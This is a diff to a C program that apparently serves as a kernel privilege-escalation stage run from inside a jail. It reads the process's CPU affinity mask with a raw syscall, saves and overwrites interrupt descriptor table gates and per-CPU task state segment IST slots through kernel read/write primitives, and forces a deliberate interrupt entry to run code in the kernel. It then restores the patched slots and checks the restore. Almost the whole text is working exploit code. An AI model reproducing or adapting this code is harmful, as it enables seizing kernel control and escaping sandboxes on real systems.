@@ -173,23 +173,55 @@ int main(int argc, char **argv)
     }
     *pargs->payloadout = 0;
 
-    /* [C1] pin to cpu 0 - CRITICAL: the int9 entry and the #DB return
-     * must land on the cpu whose IST slots we patch. */
+    /* [C1] The affinity reality (pinprobe, 2026-10-13): setaffinity is
+     * EPERM from this jail and the native cpuset is 16 bytes; the
+     * process is ALREADY confined by its spawn mask (measured: CPUs
+     * {9,11,13,15}). So: no pinning - READ the mask (getaffinity 487
+     * works) and patch the IST slots of exactly the CPUs we can run
+     * on. The deliberate int 9 fires only from our own thread, so the
+     * entry always lands on a masked CPU; v9 has no natural events
+     * (rung 2), so the unmasked CPUs' only exposure is the shared-gate
+     * v1/#DB residual (the acknowledged cross-CPU risk). */
+    int nc = 0;
+    int cpus[16];
     {
         long tid = -1;
+        int cf = 0;
         if(rs5(432, (long)&tid, 0, 0, 0, 0) != 0 || tid < 0) {
             printf("[C1] FAIL: thr_self\n");
             fflush(stdout);
             return 3;
         }
-        uint64_t mask[2] = {1, 0};  /* cpu 0 */
-        long r = rs5(488, 2 /*CPU_LEVEL_WHICH*/, 1 /*CPU_WHICH_TID*/,
-                     tid, 16, (long)mask);
-        printf("[C1] pin: tid=%ld cpuset_setaffinity=%ld (cpu0)\n", tid, r);
-        fflush(stdout);
+        unsigned char mask[16];
+        memset(mask, 0, sizeof(mask));
+        /* getaffinity(487, CPU_LEVEL_WHICH, CPU_WHICH_TID, tid, 16, mask)
+         * - the pinprobe-verified invocation */
+        long r;
+        {
+            register long r10 __asm__("r10") = 16;
+            register long r8 __asm__("r8") = (long)mask;
+            __asm__ volatile("syscall"
+                             : "=a"(r)
+                             : "a"(487L), "D"(2L), "S"(1L), "d"(tid),
+                               "r"(r10), "r"(r8)
+                             : "rcx", "r11", "memory");
+        }
         if(r != 0) {
-            printf("[C1] FAIL: pinning failed - ABORT (the entry must land "
-                   "on cpu0)\n");
+            printf("[C1] FAIL: getaffinity ret=%ld\n", r);
+            fflush(stdout);
+            return 3;
+        }
+        for(int cpu = 0; cpu < 16; cpu++)
+            if(mask[cpu >> 3] & (1 << (cpu & 7)))
+                cpus[nc++] = cpu;
+        printf("[C1] tid=%ld affinity mask=%02x%02x -> %d cpus:",
+               tid, mask[0], mask[1], nc);
+        for(int i = 0; i < nc; i++)
+            printf(" %d", cpus[i]);
+        printf("\n");
+        fflush(stdout);
+        if(nc == 0) {
+            printf("[C1] FAIL: empty affinity mask\n");
             fflush(stdout);
             return 3;
         }
@@ -234,28 +266,37 @@ int main(int argc, char **argv)
            (unsigned long long)uretframe, (unsigned long long)pivot);
     fflush(stdout);
 
-    /* [C4] save the originals */
+    /* [C4] save the originals: the two gates + the IST slots of every
+     * affinity-masked CPU (the entry/return land on one of them) */
     uint64_t gate9 = offsets.idt + (uint64_t)VEC_V9 * 16;
     uint64_t gate1 = offsets.idt + (uint64_t)VEC_DB * 16;
-    uint64_t ist3_cpu0 = offsets.tss_array + 0 * TSS_STRIDE + IST3_OFF;
-    uint64_t ist4_cpu0 = offsets.tss_array + 0 * TSS_STRIDE + IST4_OFF;
 
     unsigned char g9o[16], g1o[16];
-    uint64_t g9_lo, g9_hi, g1_lo, g1_hi, ist3o, ist4o;
-    if(copyout(g9o, gate9, 16) != 16 || copyout(g1o, gate1, 16) != 16 ||
-       copyout(&ist3o, ist3_cpu0, 8) != 8 || copyout(&ist4o, ist4_cpu0, 8) != 8) {
-        printf("[C4] FAIL: save copyouts\n");
+    uint64_t g9_lo, g9_hi, g1_lo, g1_hi;
+    uint64_t ist3o[16], ist4o[16];
+    if(copyout(g9o, gate9, 16) != 16 || copyout(g1o, gate1, 16) != 16) {
+        printf("[C4] FAIL: gate save copyouts\n");
         fflush(stdout);
         return 5;
     }
     memcpy(&g9_lo, g9o, 8); memcpy(&g9_hi, g9o + 8, 8);
     memcpy(&g1_lo, g1o, 8); memcpy(&g1_hi, g1o + 8, 8);
     uint16_t kcs = (uint16_t)(g9_lo >> 16);
+    for(int i = 0; i < nc; i++) {
+        uint64_t a3 = offsets.tss_array + (uint64_t)cpus[i] * TSS_STRIDE + IST3_OFF;
+        uint64_t a4 = offsets.tss_array + (uint64_t)cpus[i] * TSS_STRIDE + IST4_OFF;
+        if(copyout(&ist3o[cpus[i]], a3, 8) != 8 ||
+           copyout(&ist4o[cpus[i]], a4, 8) != 8) {
+            printf("[C4] FAIL: ist save copyout (cpu %d)\n", cpus[i]);
+            fflush(stdout);
+            return 5;
+        }
+    }
     printf("[C4] saved: g9(lo=0x%llx hi=0x%llx) g1(lo=0x%llx hi=0x%llx) "
-           "ist3=0x%llx ist4=0x%llx kcs=0x%x\n",
+           "kcs=0x%x; %d cpus' ist3/ist4\n",
            (unsigned long long)g9_lo, (unsigned long long)g9_hi,
            (unsigned long long)g1_lo, (unsigned long long)g1_hi,
-           (unsigned long long)ist3o, (unsigned long long)ist4o, kcs);
+           kcs, nc);
     fflush(stdout);
     if(!kcs) {
         printf("[C4] FAIL: implausible gate selector\n");
@@ -263,16 +304,18 @@ int main(int argc, char **argv)
         return 5;
     }
 
-    /* [C5] the minimal patch: 2 gates + 2 IST slots, cpu 0 only,
-     * single-qword writes, gate hi first / lo last. The IDT is shared;
-     * the CPU0 pin does not constrain #DB events on other CPUs.
+    /* [C5] the minimal patch: 2 gates (shared IDT) + the ist3/ist4 slots
+     * of every affinity-masked CPU (the entry/return land on one of
+     * them), all single-qword writes, gate hi first / lo last. The IDT
+     * is shared; the affinity mask does not constrain #DB events on
+     * other CPUs.
      *
      * PATCH-LIFECYCLE RULE (from the owner's review question): after the
      * FIRST patch write lands, NO failure path may exit without the full
      * best-effort restore. patch_started is set after the first write;
-     * every failure goes to cleanup, which restores all six slots (each
-     * write individually checked and reported, none able to abort the
-     * others) and verifies the restore - a failed restore prints the
+     * every failure goes to cleanup, which restores all patched slots
+     * (each write individually checked and reported, none able to abort
+     * the others) and verifies the restore - a failed restore prints the
      * POWER-CYCLE instruction loudly. The one unfixable case: a hard
      * freeze inside run_in_kernel itself (the machine dies mid-machinery
      * with the patch live) - the accepted deliberate-entry risk. */
@@ -302,8 +345,12 @@ int main(int argc, char **argv)
     PW(gate9, n9_lo, "gate9 lo");
     PW(gate1 + 8, n1_hi, "gate1 hi");
     PW(gate1, n1_lo, "gate1 lo");
-    PW(ist3_cpu0, ist3v, "ist3");
-    PW(ist4_cpu0, ist4v, "ist4");
+    for(int i = 0; i < nc; i++) {
+        uint64_t a3 = offsets.tss_array + (uint64_t)cpus[i] * TSS_STRIDE + IST3_OFF;
+        uint64_t a4 = offsets.tss_array + (uint64_t)cpus[i] * TSS_STRIDE + IST4_OFF;
+        PW(a3, ist3v, "ist3");
+        PW(a4, ist4v, "ist4");
+    }
 #undef PW
 
     /* readback verify - a failure here ALSO goes to cleanup (the state is
@@ -326,16 +373,22 @@ int main(int argc, char **argv)
         printf("[C5] FAIL: gate1 readback\n"); fflush(stdout);
         rc_final = 6; goto cleanup;
     }
-    if(copyout(&c_ist3, ist3_cpu0, 8) != 8 ||
-       copyout(&c_ist4, ist4_cpu0, 8) != 8) {
-        printf("[C5] FAIL: IST readback copyout\n"); fflush(stdout);
-        rc_final = 6; goto cleanup;
+    /* IST readback verify: every masked CPU's slots */
+    for(int i = 0; i < nc; i++) {
+        uint64_t a3 = offsets.tss_array + (uint64_t)cpus[i] * TSS_STRIDE + IST3_OFF;
+        uint64_t a4 = offsets.tss_array + (uint64_t)cpus[i] * TSS_STRIDE + IST4_OFF;
+        if(copyout(&c_ist3, a3, 8) != 8 || copyout(&c_ist4, a4, 8) != 8) {
+            printf("[C5] FAIL: IST readback copyout (cpu %d)\n", cpus[i]);
+            fflush(stdout);
+            rc_final = 6; goto cleanup;
+        }
+        if(c_ist3 != ist3v || c_ist4 != ist4v) {
+            printf("[C5] FAIL: ist readback (cpu %d)\n", cpus[i]);
+            fflush(stdout);
+            rc_final = 6; goto cleanup;
+        }
     }
-    if(c_ist3 != ist3v || c_ist4 != ist4v) {
-        printf("[C5] FAIL: ist readback\n"); fflush(stdout);
-        rc_final = 6; goto cleanup;
-    }
-    printf("[C5] patch verified (g9 g1 ist3 ist4) - ENTERING\n");
+    printf("[C5] patch verified (g9 g1 + %d cpus' ist3/ist4) - ENTERING\n", nc);
     fflush(stdout);
 
     /* [C6] the deliberate one-shot: run_in_kernel with the cookie target */
@@ -380,8 +433,12 @@ cleanup:
         wfail += (copyin(gate9 + 8, &g9_hi, 8) != 8);
         wfail += (copyin(gate1, &g1_lo, 8) != 8);
         wfail += (copyin(gate1 + 8, &g1_hi, 8) != 8);
-        wfail += (copyin(ist3_cpu0, &ist3o, 8) != 8);
-        wfail += (copyin(ist4_cpu0, &ist4o, 8) != 8);
+        for(int i = 0; i < nc; i++) {
+            uint64_t a3 = offsets.tss_array + (uint64_t)cpus[i] * TSS_STRIDE + IST3_OFF;
+            uint64_t a4 = offsets.tss_array + (uint64_t)cpus[i] * TSS_STRIDE + IST4_OFF;
+            wfail += (copyin(a3, &ist3o[cpus[i]], 8) != 8);
+            wfail += (copyin(a4, &ist4o[cpus[i]], 8) != 8);
+        }
 
         if(copyout(chk, gate9, 16) == 16) {
             memcpy(&c_lo, chk, 8); memcpy(&c_hi, chk + 8, 8);
@@ -391,13 +448,24 @@ cleanup:
             memcpy(&c_lo, chk, 8); memcpy(&c_hi, chk + 8, 8);
             ok1 = (c_lo == g1_lo && c_hi == g1_hi);
         } else rfail++;
-        if(copyout(&c_ist3, ist3_cpu0, 8) == 8 &&
-           copyout(&c_ist4, ist4_cpu0, 8) == 8)
-            oki = (c_ist3 == ist3o && c_ist4 == ist4o);
-        else rfail++;
+        oki = 1;
+        for(int i = 0; i < nc; i++) {
+            uint64_t a3 = offsets.tss_array + (uint64_t)cpus[i] * TSS_STRIDE + IST3_OFF;
+            uint64_t a4 = offsets.tss_array + (uint64_t)cpus[i] * TSS_STRIDE + IST4_OFF;
+            if(copyout(&c_ist3, a3, 8) == 8 && copyout(&c_ist4, a4, 8) == 8) {
+                if(c_ist3 != ist3o[cpus[i]] || c_ist4 != ist4o[cpus[i]]) {
+                    oki = 0;
+                    printf("[C8] cpu %d ist readback mismatch\n", cpus[i]);
+                }
+            } else {
+                oki = 0;
+                rfail++;
+            }
+        }
 
         printf("[C8] restore: writes_failed=%d readbacks_failed=%d "
-               "g9=%d g1=%d ist=%d\n", wfail, rfail, ok9, ok1, oki);
+               "g9=%d g1=%d ist(all %d cpus)=%d\n", wfail, rfail, ok9, ok1,
+               nc, oki);
         fflush(stdout);
         restore_complete = !wfail && !rfail && ok9 && ok1 && oki;
         if(!restore_complete) {
